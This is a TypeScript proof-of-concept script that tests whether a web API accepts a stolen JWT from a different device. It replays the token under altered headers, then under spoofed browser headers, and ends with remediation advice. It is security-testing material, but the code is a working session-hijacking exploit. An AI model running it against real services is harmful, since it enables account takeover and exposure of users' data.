/**
 * PoC: Device Fingerprint Bypass Attack
 * 
 * VULNERABILITY: authMiddleware.ts is in "migration mode" - fingerprint 
 * mismatch only logs warnings but doesn't block requests.
 * 
 * IMPACT: Stolen JWT tokens can be used from any device/location
 * 
 * Run: npx ts-node security-tests/exploit-fingerprint-bypass.ts
 */

import axios, { AxiosResponse } from 'axios';

// ============================================
// CONFIGURATION - Update these for your target
// ============================================
const API_BASE = 'https://api.security-test.site/api/v1';
const TIMEOUT = 10000;

// IMPORTANT: Replace with a REAL valid JWT token obtained from login
// To get a valid token:
// 1. Login via the website or API
// 2. Copy the accessToken from the response
const STOLEN_JWT = 'YOUR_REAL_JWT_TOKEN_HERE';

// ============================================
// HELPER FUNCTIONS
// ============================================

// Check if response is HTML (frontend SPA fallback) instead of API JSON
function isHtmlResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  const data = typeof response.data === 'string' ? response.data : '';
  return contentType.includes('text/html') || data.includes('<!doctype') || data.includes('<html');
}

// Check if blocked by Cloudflare or WAF
function isCloudflareBlocked(response: AxiosResponse): boolean {
  const data = typeof response.data === 'string' ? response.data : '';
  return data.includes('cf-browser-verification') || 
         data.includes('cloudflare') || 
         data.includes('challenge-platform') ||
         data.includes('__CF$cv$params');
}

// Check if we got a valid API JSON response
function isValidApiResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  return contentType.includes('application/json') && !isHtmlResponse(response);
}

async function exploitFingerprintBypass() {
  console.log('ğŸ”“ EXPLOIT: Device Fingerprint Bypass Attack\n');
  console.log('='.repeat(50));
  
  // Check if token is configured
  if (STOLEN_JWT === 'YOUR_REAL_JWT_TOKEN_HERE' || (STOLEN_JWT as string).length < 50) {
    console.log('\nâš ï¸ WARNING: No valid JWT token configured!');
    console.log('   Please update STOLEN_JWT with a real token from login.');
    console.log('   \n   To get a token:');
    console.log('   1. Login at https://security-test.site');
    console.log('   2. Open DevTools > Application > Local Storage');
    console.log('   3. Copy the accessToken value');
    console.log('   4. Update STOLEN_JWT in this file\n');
    return false;
  }
  
  // Attack headers - completely different from victim's device
  const attackerHeaders = {
    'Authorization': `Bearer ${STOLEN_JWT}`,
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36', // Different device
    'Accept': 'application/json',
    'Accept-Language': 'ru-RU', // Different language
    'Accept-Encoding': 'gzip',
    // Missing Sec-Fetch-* headers (automation signature)
  };

  try {
    console.log('\n[1] Attempting to access protected endpoint with stolen token...');
    console.log('    Attacker UA: Android device (victim used Windows Chrome)');
    console.log('    Attacker IP: Different from login IP');
    
    const response = await axios.get(`${API_BASE}/auth/me`, {
      headers: attackerHeaders,
      timeout: TIMEOUT,
      validateStatus: () => true
    });

    // Check for false positives
    if (isHtmlResponse(response)) {
      console.log('\nâš ï¸ INCONCLUSIVE: Received HTML instead of API response');
      console.log('   Possible causes:');
      console.log('   - Frontend SPA returning index.html for all routes');
      console.log('   - API endpoint not configured correctly');
      console.log('   - Need to test against backend directly');
      return false;
    }
    
    if (isCloudflareBlocked(response)) {
      console.log('\nâš ï¸ BLOCKED: Cloudflare challenge detected');
      console.log('   Cannot test from this IP. Try:');
      console.log('   - Testing from internal network');
      console.log('   - Whitelisting your IP in Cloudflare');
      return false;
    }

    if (response.status === 200 && isValidApiResponse(response)) {
      console.log('\nğŸš¨ VULNERABILITY CONFIRMED!');
      console.log('   Stolen token accepted from different device!');
      console.log('   Victim data exposed:', JSON.stringify(response.data, null, 2));
      return true;
    } else if (response.status === 401) {
      console.log('\nâœ… PATCHED: Token rejected (401 Unauthorized)');
      console.log('   Message:', response.data?.message || 'No message');
      return false;
    } else {
      console.log(`\nâš ï¸ Unexpected response: ${response.status}`);
      console.log('   Body:', JSON.stringify(response.data).substring(0, 200));
    }
  } catch (error: any) {
    if (error.response?.status === 401) {
      console.log('\nâœ… PATCHED: Token rejected due to fingerprint mismatch');
      return false;
    }
    console.log('\nâš ï¸ Error:', error.message);
  }
  
  return false;
}

// Attack vector 2: Automation tool pretending to be browser
async function exploitWithSpoofedHeaders() {
  console.log('\n\nğŸ”“ EXPLOIT VARIANT: Spoofed Browser Headers\n');
  console.log('='.repeat(50));
  
  // Attacker copies exact headers from victim's browser
  const spoofedHeaders = {
    'Authorization': `Bearer ${STOLEN_JWT}`,
    // Copy victim's exact User-Agent
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    // Add Sec-Fetch headers to appear as browser
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Ch-Ua': '"Chromium";v="120", "Google Chrome";v="120"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
  };

  try {
    console.log('[1] Sending request with perfectly spoofed browser headers...');
    console.log('    (Attacker copied all headers from victim\'s session)');
    
    const response = await axios.get(`${API_BASE}/auth/me`, {
      headers: spoofedHeaders,
      timeout: 10000
    });

    if (response.status === 200) {
      console.log('\nâŒ VULNERABILITY CONFIRMED!');
      console.log('   Even with spoofed headers, IP is different but still accepted!');
      console.log('   This proves fingerprint check is not enforced.');
      return true;
    }
  } catch (error: any) {
    if (error.response?.status === 401) {
      console.log('\nâœ… PATCHED: Request blocked');
      return false;
    }
    console.log('\nâš ï¸ Error:', error.message);
  }
  
  return false;
}

// Run exploits
async function main() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     SECURITY TEST: Device Fingerprint Bypass Attack      â•‘');
  console.log('â•‘     Target: https://security-test.site                   â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('âš ï¸  This is for authorized security testing only!\n');
  
  const vuln1 = await exploitFingerprintBypass();
  const vuln2 = await exploitWithSpoofedHeaders();
  
  console.log('\n\n' + '='.repeat(50));
  console.log('SUMMARY:');
  console.log('='.repeat(50));
  
  if (vuln1 || vuln2) {
    console.log('ğŸš¨ CRITICAL: Fingerprint bypass vulnerability exists!');
    console.log('\nREMEDIATION:');
    console.log('1. Enable blocking in authMiddleware.ts (remove migration mode)');
    console.log('2. Add IP binding to JWT claims');
    console.log('3. Implement short token expiry + refresh token rotation');
  } else {
    console.log('âœ… Fingerprint protection appears to be working');
  }
}

main().catch(console.error);
